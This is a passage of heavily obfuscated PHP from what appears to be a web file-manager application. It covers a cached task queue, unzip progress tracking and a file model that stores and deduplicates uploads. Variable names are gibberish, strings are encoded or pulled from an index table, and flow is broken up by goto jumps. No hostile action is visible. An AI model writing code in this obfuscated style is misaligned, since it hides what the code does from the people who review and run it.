self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($­é£üßˆ as $Çğ±íÍ) { if (isset($ÏÛö‰úØ[$Çğ±íÍ])) { $­é£üßˆ = array_merge($­é£üßˆ, $ÏÛö‰úØ[$Çğ±íÍ]); } } $­é£üßˆ[] = self::AUTH_SHOW; $ŠÀï’Ÿ = array_sum(array_unique($­é£üßˆ)); } public function sort($æŠÎ£ôÛ, $•Ãî­•ò) { return parent::update($æŠÎ£ôÛ, $•Ãî­•ò); } } goto aò µ™ë’ù; b”ëÇŞÙ†: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\165\x65\165\145\x4c\x65\x6e\147\x74\x68"; const QUEUE_DATA = "\164\141\x73\153\x51\165\x65\x75\x65\x44\141\x74\x61"; const QUEUE_TIME = "\x74\141\x73\x6b\121\x75\145\165\145\x4c\141\x73\x74\x52\x75\156"; const QUEUE_THREAD = "\x74\141\x73\x6b\x51\x75\145\165\145\124\x68\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Ç´ËÜÓ°, $Æ™áŠø† = array(), $€˜éúÀ® = '', $Åğ·à¿î = '') { $¹–è§Ùã =& $_SERVER[ˆ¡¹µ‹Â]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Åğ·à¿î && array_find_by_field(self::$listData, $¹–è§Ùã[97], $Åğ·à¿î)) { return !0; } if ($Åğ·à¿î && array_find_by_field(self::$listDataAdd, $¹–è§Ùã[97], $Åğ·à¿î)) { return !0; } self::$listDataAdd[] = array($¹–è§Ùã[341] => $Ç´ËÜÓ°, $¹–è§Ùã[1861] => $Æ™áŠø†, $¹–è§Ùã[526] => $€˜éúÀ®, $¹–è§Ùã[97] => $Åğ·à¿î); return !0; } public static function addSubmit() { $İ„È™±Â =& $_SERVER[ˆ¡¹µ‹Â]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($İ„È™±Â[1862] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $İ„È™±Â[12], $İ„È™±Â[526])), $İ„È™±Â[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($¾æå¸º•, $÷ü¤¤òä = array(), $‘ÚœÚÏ† = '', $‡¾Ş•› = '') { $Úêœœıä =& $_SERVER[ˆ¡¹µ‹Â]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‘ı™¢ó¤ = self::getAll(); if ($‡¾Ş•› && array_find_by_field($‘ı™¢ó¤, $Úêœœıä[97], $‡¾Ş•›)) { return !0; } $‘ı™¢ó¤[] = array($Úêœœıä[341] => $¾æå¸º•, $Úêœœıä[1861] => $÷ü¤¤òä, $Úêœœıä[526] => $‘ÚœÚÏ†, $Úêœœıä[97] => $‡¾Ş•›); self::setAll($‘ı™¢ó¤); write_log($Úêœœıä[1862] . $‘ÚœÚÏ†, $Úêœœıä[197]); return !0; } public static function run() { $¶ÆÅ§ã« =& $_SERVER[ˆ¡¹µ‹Â]; $¬—òø’œ = self::getAll(); $Œ°‰„È¶ = array_shift($¬—òø’œ); if (!$Œ°‰„È¶) { return !1; } self::setAll($¬—òø’œ); $¨Ì³üì = timeFloat(); $ÄÒÑ«Ôö = $¶ÆÅ§ã«[12]; try { $ÄÒÑ«Ôö = Hook::apply($Œ°‰„È¶[$¶ÆÅ§ã«[341]], $Œ°‰„È¶[$¶ÆÅ§ã«[1861]]); } catch (Exception $Ù‰–ƒ¼) { write_log($Ù‰–ƒ¼, $¶ÆÅ§ã«[1257]); } $™şÂÊ™ö = number_format(timeFloat() - $¨Ì³üì, 3) . $¶ÆÅ§ã«[1779]; if ($ÄÒÑ«Ôö && is_string($ÄÒÑ«Ôö)) { $™şÂÊ™ö = $™şÂÊ™ö . $¶ÆÅ§ã«[1863] . $ÄÒÑ«Ôö; } write_log($¶ÆÅ§ã«[1864] . $Œ°‰„È¶[$¶ÆÅ§ã«[526]] . $¶ÆÅ§ã«[1865] . $™şÂÊ™ö, $¶ÆÅ§ã«[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $£ÍÏ±¯Ö =& $_SERVER[ˆ¡¹µ‹Â]; $¹Ü–Ò = self::threadCount() + 1; if ($¹Ü–Ò > 3 || !self::count()) { return; } write_log($£ÍÏ±¯Ö[1866] . $¹Ü–Ò, $£ÍÏ±¯Ö[197]); Cache::set(self::QUEUE_THREAD, $¹Ü–Ò, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($£ÍÏ±¯Ö[1867], $£ÍÏ±¯Ö[197]); } public static function getKey($”µ˜€, $Ì¸úú«µ = "\x69\x6e\164") { $åôçú¹‰ =& $_SERVER[ˆ¡¹µ‹Â]; Cache::removeMemory($”µ˜€); $‹à€£¨ = Cache::get($”µ˜€); if ($Ì¸úú«µ == $åôçú¹‰[364]) { return $‹à€£¨ ? intval($‹à€£¨) : 0; } if ($Ì¸úú«µ == $åôçú¹‰[1868]) { return is_array($‹à€£¨) ? $‹à€£¨ : array(); } return $‹à€£¨; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ˆ¡¹µ‹Â][1868]); } public static function setAll($¾ÂÖ°óà) { $şğÌü÷Ú = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¾ÂÖ°óà), $şğÌü÷Ú); Cache::set(self::QUEUE_DATA, $¾ÂÖ°óà, $şğÌü÷Ú); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($òşÀµ, $ö¡Şğ‘’ = 5.0) { if (!$òşÀµ) { return; } $°İş¤Ø = Cache::get($òşÀµ); if (!$°İş¤Ø || timeFloat() - floatVal($°İş¤Ø) >= $ö¡Şğ‘’) { Cache::set($òşÀµ, timeFloat(), $ö¡Şğ‘’ * 10); return !0; } return !1; } public static function timeLimitCall($æÇêšà, $Íëá¡±, $Û˜‰™, $ò¦Ÿ¾˜ = 5.0) { $×…éÂ†Ÿ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$æÇêšà || !$Íëá¡±) { return; } self::$asyncAdd = !0; $‹óÜª¯ = $×…éÂ†Ÿ[1869]; $–ŒÆ¹ôÕ = Cache::get($‹óÜª¯, !0); $´Ø¾·å§ = array($×…éÂ†Ÿ[1870] => timeFloat(), $×…éÂ†Ÿ[1871] => timeFloat(), $×…éÂ†Ÿ[341] => $Íëá¡±, $×…éÂ†Ÿ[1861] => $Û˜‰™, $×…éÂ†Ÿ[206] => $ò¦Ÿ¾˜); if (is_array($–ŒÆ¹ôÕ[$æÇêšà])) { $´Ø¾·å§[$×…éÂ†Ÿ[1871]] = $–ŒÆ¹ôÕ[$æÇêšà][$×…éÂ†Ÿ[1871]]; } if (is_array($–ŒÆ¹ôÕ[$æÇêšà])) { if (timeFloat() - $–ŒÆ¹ôÕ[$æÇêšà][$×…éÂ†Ÿ[1870]] < $´Ø¾·å§[$×…éÂ†Ÿ[206]] * 0.3) { return; } $´Ø¾·å§[$×…éÂ†Ÿ[1871]] = $–ŒÆ¹ôÕ[$æÇêšà][$×…éÂ†Ÿ[1871]]; } $–ŒÆ¹ôÕ[$æÇêšà] = $´Ø¾·å§; Cache::set($‹óÜª¯, $–ŒÆ¹ôÕ, 60); Cache::removeMemory($‹óÜª¯); write_log($×…éÂ†Ÿ[1872] . $æÇêšà . $×…éÂ†Ÿ[74] . $Íëá¡±, $×…éÂ†Ÿ[197]); } public static function timeLimitCallLoop() { $ßá¶¦„ï =& $_SERVER[ˆ¡¹µ‹Â]; $íŸ³ºã = array($ßá¶¦„ï[1873]); $‚óÃŒÃ° = in_array(strtolower(ACTION), $íŸ³ºã); if (!$‚óÃŒÃ° && !self::$asyncAdd) { return; } $¨–íÏ— = $ßá¶¦„ï[1869]; $€ªÂÇÜš = Cache::get($¨–íÏ—, !0); if (!$€ªÂÇÜš || count($€ªÂÇÜš) <= 0) { return; } $úÖáÛæ = !1; $ã ¬Öİ‚ = timeFloat(); $Êšº›ë = array(); foreach ($€ªÂÇÜš as $ôû»ºÏ => $”Çıµ¾) { if ($ã ¬Öİ‚ - $”Çıµ¾[$ßá¶¦„ï[1871]] > $”Çıµ¾[$ßá¶¦„ï[206]]) { $úÖáÛæ = !0; try { Hook::apply($”Çıµ¾[$ßá¶¦„ï[341]], $”Çıµ¾[$ßá¶¦„ï[1861]]); write_log($ßá¶¦„ï[1874] . $ôû»ºÏ . $ßá¶¦„ï[74] . $”Çıµ¾[$ßá¶¦„ï[341]] . $ßá¶¦„ï[1875] . ACTION, $ßá¶¦„ï[197]); } catch (Exception $³ÊÆ…“) { } continue; } $Êšº›ë[$ôû»ºÏ] = $”Çıµ¾; } if (!$úÖáÛæ) { return; } if (!$Êšº›ë) { return Cache::remove($¨–íÏ—); } Cache::set($¨–íÏ—, $Êšº›ë, 60); Cache::removeMemory($¨–íÏ—); } public static function finished($±»©Ôøº, $Çé“òå) { $÷‚ØÆ±› =& $_SERVER[ˆ¡¹µ‹Â]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($÷‚ØÆ±›[341] => $±»©Ôøº, $÷‚ØÆ±›[1861] => $Çé“òå); } private static function finishedRun() { $ï×åµİ— =& $_SERVER[ˆ¡¹µ‹Â]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $‘¨Ù‚Ó) { try { Hook::apply($‘¨Ù‚Ó[$ï×åµİ—[341]], $‘¨Ù‚Ó[$ï×åµİ—[1861]]); } catch (Exception $å÷ã«ç) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $€’İèó =& $_SERVER[ˆ¡¹µ‹Â]; parent::startAfter(); Hook::bind($€’İèó[1876], array($this, $€’İèó[1877])); Hook::bind($€’İèó[1271], array($this, $€’İèó[1878])); Hook::bind($€’İèó[1879], array($this, $€’İèó[1880])); $‚”Êê¨ =& $this->task; $‚”Êê¨[$€’İèó[1881]] = $€’İèó[1272]; if (!$‚”Êê¨[$€’İèó[1652]]) { $‚”Êê¨[$€’İèó[1652]] = LNG($€’İèó[1882]); } } protected function endAfter() { $Ÿå£û =& $_SERVER[ˆ¡¹µ‹Â]; parent::endAfter(); Hook::unbind($Ÿå£û[1876], array($this, $Ÿå£û[1877])); Hook::unbind($Ÿå£û[1271], array($this, $Ÿå£û[1878])); Hook::unbind($Ÿå£û[1879], array($this, $Ÿå£û[1880])); } public function updateAfter() { $ÓüÈ¢æş =& $_SERVER[ˆ¡¹µ‹Â]; $§àîö¼” =& $this->task; if (!$§àîö¼”[$ÓüÈ¢æş[1134]] || !$§àîö¼”[$ÓüÈ¢æş[830]]) { if ($§àîö¼”[$ÓüÈ¢æş[1881]] != $ÓüÈ¢æş[389]) { return; } } if ($§àîö¼”[$ÓüÈ¢æş[1881]] == $ÓüÈ¢æş[1272]) { $åŠÇı¿² = 0; if ($§àîö¼”[$ÓüÈ¢æş[1816]]) { $åŠÇı¿² = $§àîö¼”[$ÓüÈ¢æş[1817]] / $§àîö¼”[$ÓüÈ¢æş[1816]]; } $§àîö¼”[$ÓüÈ¢æş[1765]] = $åŠÇı¿² * 0.3; } else { if ($§àîö¼”[$ÓüÈ¢æş[1881]] == $ÓüÈ¢æş[389]) { $åŠÇı¿² = $§àîö¼”[$ÓüÈ¢æş[1764]] / $§àîö¼”[$ÓüÈ¢æş[1134]]; $§àîö¼”[$ÓüÈ¢æş[1765]] = 0.3 + $åŠÇı¿² * 0.4; } else { if ($§àîö¼”[$ÓüÈ¢æş[1881]] == $ÓüÈ¢æş[110]) { $•Â¿Ã³  = 0; if ($§àîö¼”[$ÓüÈ¢æş[1818]] == $ÓüÈ¢æş[110]) { $•Â¿Ã³  = $§àîö¼”[$ÓüÈ¢æş[1817]]; } $åŠÇı¿² = ($§àîö¼”[$ÓüÈ¢æş[1821]] + $•Â¿Ã³ ) / $§àîö¼”[$ÓüÈ¢æş[830]]; $§àîö¼”[$ÓüÈ¢æş[1765]] = 0.3 + 0.4 + $åŠÇı¿² * 0.3; } } } if ($§àîö¼”[$ÓüÈ¢æş[1765]] > 0) { $ÁÄ×ÔŒ = timeFloat() - $§àîö¼”[$ÓüÈ¢æş[1767]] - $§àîö¼”[$ÓüÈ¢æş[1770]]; $§àîö¼”[$ÓüÈ¢æş[1771]] = $ÁÄ×ÔŒ * (1 - $§àîö¼”[$ÓüÈ¢æş[1765]]) / $§àîö¼”[$ÓüÈ¢æş[1765]]; } } public function addFile($ Û²Ô×Û) { $Ê ïœÍ³ =& $_SERVER[ˆ¡¹µ‹Â]; $‰ÅäàĞ =& $this->task; $‹æúˆ‡Ú = IO::info($ Û²Ô×Û); $‰ÅäàĞ[$Ê ïœÍ³[1814]] = $‹æúˆ‡Ú[$Ê ïœÍ³[32]]; $‰ÅäàĞ[$Ê ïœÍ³[1816]] = $‹æúˆ‡Ú[$Ê ïœÍ³[79]]; $‰ÅäàĞ[$Ê ïœÍ³[1817]] = 0; $‰ÅäàĞ[$Ê ïœÍ³[1136]] = $Ê ïœÍ³[1837]; $‰ÅäàĞ[$Ê ïœÍ³[1818]] = $Ê ïœÍ³[1272]; $‰ÅäàĞ[$Ê ïœÍ³[830]] = $‹æúˆ‡Ú[$Ê ïœÍ³[79]]; $‰ÅäàĞ[$Ê ïœÍ³[1134]] = 1; $ç•Õ¢¼Ï = 0; $‰ÅäàĞ[$Ê ïœÍ³[1825]] = array($Ê ïœÍ³[1826] => $ç•Õ¢¼Ï + 1, $Ê ïœÍ³[494] => $‹æúˆ‡Ú[$Ê ïœÍ³[32]], $Ê ïœÍ³[87] => $‹æúˆ‡Ú[$Ê ïœÍ³[87]], $Ê ïœÍ³[582] => $‹æúˆ‡Ú[$Ê ïœÍ³[582]] ? $‹æúˆ‡Ú[$Ê ïœÍ³[582]] : $‹æúˆ‡Ú[$Ê ïœÍ³[87]]); $this->update(); } public function zipEvent($±ùôÎ»¦, $œâßÍí, $»ÇĞ™ıñ, $àÒÛ¨°Ÿ) { $¯ïÆŒÛú =& $_SERVER[ˆ¡¹µ‹Â]; $Ÿ°Ÿ÷À‡ =& $this->task; $Ÿ°Ÿ÷À‡[$¯ïÆŒÛú[1814]] = get_path_this($œâßÍí); $Ÿ°Ÿ÷À‡[$¯ïÆŒÛú[1816]] = $àÒÛ¨°Ÿ; $Ÿ°Ÿ÷À‡[$¯ïÆŒÛú[1817]] = $»ÇĞ™ıñ; $Ÿ°Ÿ÷À‡[$¯ïÆŒÛú[1136]] = $±ùôÎ»¦ == $¯ïÆŒÛú[1883] ? $¯ïÆŒÛú[1884] : $¯ïÆŒÛú[1885]; $Ÿ°Ÿ÷À‡[$¯ïÆŒÛú[1818]] = $¯ïÆŒÛú[12]; $Ÿ°Ÿ÷À‡[$¯ïÆŒÛú[830]] = $àÒÛ¨°Ÿ; $Ÿ°Ÿ÷À‡[$¯ïÆŒÛú[1881]] = $¯ïÆŒÛú[389]; $this->update(); } public function unzipAfter($óÁçìÄ) { $»¬üâµ– =& $_SERVER[ˆ¡¹µ‹Â]; $úÉµ‰• =& $this->task; $úÉµ‰•[$»¬üâµ–[1881]] = $»¬üâµ–[110]; $™åÂ¶Ç¾ = IO::infoWithChildren($óÁçìÄ); $ ’ê÷ü = 0; $úÉµ‰•[$»¬üâµ–[1825]] = array($»¬üâµ–[1826] => $ ’ê÷ü + 1, $»¬üâµ–[494] => $™åÂ¶Ç¾[$»¬üâµ–[32]], $»¬üâµ–[87] => $™åÂ¶Ç¾[$»¬üâµ–[87]], $»¬üâµ–[582] => $™åÂ¶Ç¾[$»¬üâµ–[582]] ? $™åÂ¶Ç¾[$»¬üâµ–[582]] : $™åÂ¶Ç¾[$»¬üâµ–[87]]); if ($™åÂ¶Ç¾[$»¬üâµ–[33]] == $»¬üâµ–[230]) { $úÉµ‰•[$»¬üâµ–[1134]] = 1; } else { $úÉµ‰•[$»¬üâµ–[1134]] = $™åÂ¶Ç¾[$»¬üâµ–[82]][$»¬üâµ–[80]]; } $úÉµ‰•[$»¬üâµ–[1136]] = $»¬üâµ–[12]; $úÉµ‰•[$»¬üâµ–[1818]] = 0; $úÉµ‰•[$»¬üâµ–[1764]] = 0; $úÉµ‰•[$»¬üâµ–[1816]] = 0; $úÉµ‰•[$»¬üâµ–[1817]] = 0; $úÉµ‰•[$»¬üâµ–[1814]] = $»¬üâµ–[12]; $úÉµ‰•[$»¬üâµ–[1821]] = 0; $úÉµ‰•[$»¬üâµ–[830]] = $™åÂ¶Ç¾[$»¬üâµ–[79]]; $this->update(); self::log($»¬üâµ–[1886] . json_encode(array($úÉµ‰•, $™åÂ¶Ç¾))); } public function nameParse($»˜‡şŸÛ) { $£ÜÎ˜ñª =& $_SERVER[ˆ¡¹µ‹Â]; $ıèâ˜ôÊ =& $this->task; if ($ıèâ˜ôÊ[$£ÜÎ˜ñª[1881]] == $£ÜÎ˜ñª[1272]) { $ıèâ˜ôÊ[$£ÜÎ˜ñª[1881]] = $£ÜÎ˜ñª[389]; $ıèâ˜ôÊ[$£ÜÎ˜ñª[1821]] = 0; $ıèâ˜ôÊ[$£ÜÎ˜ñª[830]] = 0; } $²åƒ‡ÙŸ = get_path_this($»˜‡şŸÛ); if (strstr($²åƒ‡ÙŸ, $£ÜÎ˜ñª[10])) { $ıèâ˜ôÊ[$£ÜÎ˜ñª[1764]] += 1; $ıèâ˜ôÊ[$£ÜÎ˜ñª[1134]] += 1; } $ıèâ˜ôÊ[$£ÜÎ˜ñª[1814]] = $»˜‡şŸÛ; $this->update(); } } goto BÚÃ…©ğ¡«; B÷®É¢Ó®ö: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\154\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\x61\x6d\145" => "\x69\x6f\137\x66\x69\x6c\x65\137\155\145\164\x61", "\x6d\x65\x74\x61\106\151\x65\x6c\144" => "\x66\x69\154\145\x49\x44"); public function fileInfo($û‚ùé¹¸) { $’ïçø¸¦ =& $_SERVER[ˆ¡¹µ‹Â]; static $¯å¬Å¿¢ = array(); if (!isset($¯å¬Å¿¢[$û‚ùé¹¸])) { $Ì­Ã¾ò­ = $’ïçø¸¦[2012]; $¨ˆ¼ñ§ = Model($’ïçø¸¦[544])->field($Ì­Ã¾ò­)->where(array($’ïçø¸¦[542] => $û‚ùé¹¸))->find(); $¯å¬Å¿¢[$û‚ùé¹¸] = $¨ˆ¼ñ§; } return $¯å¬Å¿¢[$û‚ùé¹¸]; } public function addFileByContent($„‡ÊĞŒÔ = '', $ù¬’Å£ = '') { $±è‹Ğ„š =& $_SERVER[ˆ¡¹µ‹Â]; $³‘—ùµí = TEMP_PATH . $±è‹Ğ„š[2013]; if (!is_dir($³‘—ùµí)) { mk_dir($³‘—ùµí); } $®Ê‡ù¾¸ = $³‘—ùµí . $±è‹Ğ„š[2014] . rand_string(16); file_put_contents($®Ê‡ù¾¸, $„‡ÊĞŒÔ); $£Á’é = $this->addFile($®Ê‡ù¾¸, $ù¬’Å£, !0); if (file_exists($®Ê‡ù¾¸)) { @unlink($®Ê‡ù¾¸); } return $£Á’é; } public function createFileName($­ÊãÙ‰, $Ø›¢Ù³ü = false, $îÅàâş = false) { $ê××µ² =& $_SERVER[ˆ¡¹µ‹Â]; $çİÔ½Ö = IO::init($ê××µ²[8]); $Ì—ÅÅ²º = $this->makeFilePath($­ÊãÙ‰, $çİÔ½Ö, $Ø›¢Ù³ü, $îÅàâş); $ÏÖÁ­“ú = $çİÔ½Ö->pathFather($Ì—ÅÅ²º); static $µ¨°—Çñ = false; $·şÙæ‚ = $ê××µ²[2015] . md5($ÏÖÁ­“ú); if (!$µ¨°—Çñ && !Cache::get($·şÙæ‚)) { $µ¨°—Çñ = !0; $™óŸ­â€ = IO::mkdir($ÏÖÁ­“ú); if (!IO::exist($™óŸ­â€ . $ê××µ²[872])) { IO::mkfile($™óŸ­â€ . $ê××µ²[872]); } Cache::set($·şÙæ‚, 1, 3600 * 2); } return $Ì—ÅÅ²º; } public function makeFilePath($ş–Ñ‹æ‹, $³ß»™ªö, $ÈûÆ¡™ = false, $‰”’¨ë = false) { $‚€ó¡‡› =& $_SERVER[ˆ¡¹µ‹Â]; $Éóş‚õ¨ = Model($‚€ó¡‡›[837])->get($‚€ó¡‡›[2016]); $Ó„ØÛæ™ = KodIO::defaultIO() . date($‚€ó¡‡›[2017]); $¬À÷›â = $Ó„ØÛæ™ . rand_string(5) . short_id(100); $ş–Ñ‹æ‹ = str_replace($‚€ó¡‡›[8], $‚€ó¡‡›[11], KodIO::clear($ş–Ñ‹æ‹)); $ü’Ñ­‡¿ = $³ß»™ªö->ext($ş–Ñ‹æ‹); if (!$ş–Ñ‹æ‹) { $Éóş‚õ¨ = $‚€ó¡‡›[843]; } switch ($Éóş‚õ¨) { case $‚€ó¡‡›[2018]: if ($ü’Ñ­‡¿) { $¬À÷›â = $¬À÷›â . $‚€ó¡‡›[10] . $ü’Ñ­‡¿; } if ($ü’Ñ­‡¿ == $‚€ó¡‡›[1954]) { $¬À÷›â .= $‚€ó¡‡›[1284]; } break; case $‚€ó¡‡›[2019]: $Ì××¦ª = Model($‚€ó¡‡›[837])->get($‚€ó¡‡›[838]); $ÀÔ²’¹Ó = substr(md5($‚€ó¡‡›[839] . $Ì××¦ª . date($‚€ó¡‡›[816])), 0, 8); $…§£¶ù‹ = KodIO::defaultDriver(); $Ó„ØÛæ™ = $‚€ó¡‡›[1315] . $…§£¶ù‹[$‚€ó¡‡›[475]] . $‚€ó¡‡›[484] . date($‚€ó¡‡›[2020]) . $ÀÔ²’¹Ó . $‚€ó¡‡›[8]; if ($ü’Ñ­‡¿ == $‚€ó¡‡›[1954]) { $ş–Ñ‹æ‹ .= $‚€ó¡‡›[1284]; } $ÜË¢ö¸³ = $‚€ó¡‡›[2021] . $Ó„ØÛæ™ . $ş–Ñ‹æ‹; CacheLock::lock($ÜË¢ö¸³); $¬À÷›â = $Ó„ØÛæ™ . $ş–Ñ‹æ‹; if (IO::exist($Ó„ØÛæ™ . $ş–Ñ‹æ‹)) { $óµ²¯Õ´ = substr($ş–Ñ‹æ‹, 0, strlen($ş–Ñ‹æ‹) - strlen($ü’Ñ­‡¿)); $Î‘±µ˜Ù = $‰”’¨ë ? substr($‰”’¨ë, 0, 5) : ($ÈûÆ¡™ ? substr($ÈûÆ¡™, 0, 5) : rand_string(5)); $¬À÷›â = $Ó„ØÛæ™ . $óµ²¯Õ´ . $Î‘±µ˜Ù; if ($ü’Ñ­‡¿) { $¬À÷›â = $¬À÷›â . $‚€ó¡‡›[10] . $ü’Ñ­‡¿; } } if (IO::isOsDriver($¬À÷›â) && !IO::isUploadServer($¬À÷›â)) { if (IO::exist($¬À÷›â)) { return $¬À÷›â; } $òÔµ€ØŸ = IO::setContent($¬À÷›â, $‚€ó¡‡›[12]); if (!$òÔµ€ØŸ) { show_json($‚€ó¡‡›[2022], !1); } } CacheLock::unlock($ÜË¢ö¸³); break; case $‚€ó¡‡›[843]: break; default: break; } return $¬À÷›â; } public function addFileByRemote($¹Åß¹ñ, $ã‘×Â°×, $…Ë§…ùò = array()) { $·õËŸ™¸ =& $_SERVER[ˆ¡¹µ‹Â]; if (!IO::exist($¹Åß¹ñ)) { return !1; } $†ì¨ùíí = $…Ë§…ùò[$·õËŸ™¸[547]] ? $…Ë§…ùò[$·õËŸ™¸[547]] : $·õËŸ™¸[12]; $‘è­Ø‚“ = IO::hashMd5($¹Åß¹ñ, $†ì¨ùíí); $éš‹Ñ¤ = KodIO::defaultDriver(); $·¼ÒÂÖ = array($·õËŸ™¸[617] => IO::size($¹Åß¹ñ), $·õËŸ™¸[2023] => 1, $·õËŸ™¸[494] => $ã‘×Â°×, $·õËŸ™¸[883] => $éš‹Ñ¤[$·õËŸ™¸[475]], $·õËŸ™¸[495] => $¹Åß¹ñ, $·õËŸ™¸[2024] => $…Ë§…ùò[$·õËŸ™¸[672]] ? $…Ë§…ùò[$·õËŸ™¸[672]] : IO::hashSimple($¹Åß¹ñ), $·õËŸ™¸[2025] => $‘è­Ø‚“ ? $‘è­Ø‚“ : $†ì¨ùíí); if ($˜üş‹ê£ = $this->addFileCheckExist($·¼ÒÂÖ[$·õËŸ™¸[672]], $·¼ÒÂÖ[$·õËŸ™¸[547]], $·¼ÒÂÖ[$·õËŸ™¸[79]])) { return $˜üş‹ê£; } return $this->addFileData($·¼ÒÂÖ); } private function addFileData($½õÍ‡â) { $ãìÏŒĞ– =& $_SERVER[ˆ¡¹µ‹Â]; if (!$½õÍ‡â) { return !1; } $½õÍ‡â[$ãìÏŒĞ–[79]] = intval($½õÍ‡â[$ãìÏŒĞ–[79]]); if (!$½õÍ‡â[$ãìÏŒĞ–[79]] && strlen($½õÍ‡â[$ãìÏŒĞ–[672]]) > 32) { $½õÍ‡â[$ãìÏŒĞ–[79]] = intval(substr($½õÍ‡â[$ãìÏŒĞ–[672]], 32)); } $½ÊÖ·… = $this->add($½õÍ‡â); return $this->find($½ÊÖ·…); } public function addFile($ƒâµäÇĞ, $‰Âµƒ£, $ª”¦éÈÄ = false) { $’Ìõã =& $_SERVER[ˆ¡¹µ‹Â]; $¾ªúÃ‰Ä = IO::hashSimple($ƒâµäÇĞ); $Ìß˜İ = IO::size($ƒâµäÇĞ); $é§ôËìİ = $Ìß˜İ <= 1024 * 1024 * 10 ? IO::hashMd5($ƒâµäÇĞ) : $’Ìõã[12]; $ıúç³üÅ = $’Ìõã[2026] . $¾ªúÃ‰Ä; CacheLock::lock($ıúç³üÅ); if ($é§ôËìİ && $¾ªúÃ‰Ä) { $ÌÊ×ÖŠÔ = $this->addFileCheckExist($¾ªúÃ‰Ä, $é§ôËìİ, $Ìß˜İ); if ($ÌÊ×ÖŠÔ) { CacheLock::unlock($ıúç³üÅ); return $ÌÊ×ÖŠÔ; } } $ó§»²ö— = $this->addFileMake($ƒâµäÇĞ, $Ìß˜İ, $¾ªúÃ‰Ä, $é§ôËìİ, $‰Âµƒ£, $ª”¦éÈÄ); $âÔ¿ò£É = $this->addFileData($ó§»²ö—); CacheLock::unlock($ıúç³üÅ); if (!$é§ôËìİ && $âÔ¿ò£É) { $this->fileMd5Check($âÔ¿ò£É); } return $âÔ¿ò£É; } public function fileMd5Check($º¤ÇÕ÷°) { $´ì¬®¦ =& $_SERVER[ˆ¡¹µ‹Â]; $„Şˆïú = array($º¤ÇÕ÷°[$´ì¬®¦[541]], $º¤ÇÕ÷°[$´ì¬®¦[87]]); $Ÿî“½ı§ = $´ì¬®¦[2027] . $º¤ÇÕ÷°[$´ì¬®¦[87]]; $¤¨íøÚ = $´ì¬®¦[2028] . $º¤ÇÕ÷°[$´ì¬®¦[541]]; TaskQueue::add($´ì¬®¦[2029], $„Şˆïú, $Ÿî“½ı§, $¤¨íøÚ); } public function fileMd5Set($êµ¥ğÍ, $±Áñ½¶ƒ) { $«‰’Í¨• =& $_SERVER[ˆ¡¹µ‹Â]; $Ğç·ôÃÛ = $this->find($êµ¥ğÍ); if (!$Ğç·ôÃÛ || $Ğç·ôÃÛ[$«‰’Í¨•[547]]) { return; } $”âãâ = IO::hashMd5($±Áñ½¶ƒ); if (!$”âãâ) { return $«‰’Í¨•[12]; } $this->where(array($«‰’Í¨•[541] => $êµ¥ğÍ))->save(array($«‰’Í¨•[547] => $”âãâ)); } public function addFileMake($øŸœ¤æ, $åÃ¦€Ÿ•, $À»ç¸¬, $õ™ó©¾, $†¤ãÔùù, $ï©çĞ…ß) { $‹•Ï’–° =& $_SERVER[ˆ¡¹µ‹Â]; $ÜÄÖ¥õ‚ = $this->createFileName($†¤ãÔùù, $À»ç¸¬, $õ™ó©¾); $Éµ£–óÖ = get_path_father($ÜÄÖ¥õ‚); $¥†ñÒÎ¤ = get_path_this($ÜÄÖ¥õ‚); if ($ï©çĞ…ß) { $¤Õ¯¯ŞÃ = IO::move($øŸœ¤æ, $Éµ£–óÖ, !1, $¥†ñÒÎ¤); } else { $¤Õ¯¯ŞÃ = IO::copy($øŸœ¤æ, $Éµ£–óÖ, !1, $¥†ñÒÎ¤); } if (!$¤Õ¯¯ŞÃ) { return !1; } $Ò‹ë–—× = KodIO::defaultDriver(); $ä»¦ôÙ– = array($‹•Ï’–°[617] => $åÃ¦€Ÿ•, $‹•Ï’–°[2023] => 1, $‹•Ï’–°[494] => $†¤ãÔùù, $‹•Ï’–°[883] => $Ò‹ë–—×[$‹•Ï’–°[475]], $‹•Ï’–°[495] => $ÜÄÖ¥õ‚, $‹•Ï’–°[2024] => $À»ç¸¬, $‹•Ï’–°[2025] => $õ™ó©¾); return $ä»¦ôÙ–; } public function addFileCheckExist($ŒøÕ‹æ, $¾ÍıÊ•™, $Çú«³) { $ÏÅ‰ä =& $_SERVER[ˆ¡¹µ‹Â]; $íÒã® = $this->findByHash($ŒøÕ‹æ, $¾ÍıÊ•™); if (!$íÒã®) { return !1; } $Ôèı•ê¾ = 